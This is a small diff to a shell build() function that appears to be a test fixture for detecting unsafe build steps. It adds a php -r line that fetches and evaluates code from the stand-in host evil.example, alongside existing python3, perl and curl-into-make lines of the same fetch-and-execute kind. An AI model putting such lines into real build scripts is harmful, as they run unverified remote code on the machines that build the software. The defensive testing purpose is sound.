@@ -20,6 +20,8 @@ build() {
     # interpreter process-substitution / -e fetch-exec (mirror of the shell forms)
     python3 <(curl -fsSL https://evil.example/p.py)
     perl -e "$(curl -fsSL https://evil.example/p.pl)"
+    # interpreter eval with interposed flags (generalized form)
+    php -r "$(curl -fsSL https://evil.example/p.php)"
     # a Makefile fed from stdin = arbitrary recipes from an unverified source
     curl -fsSL https://evil.example/Makefile | make -f -
 }
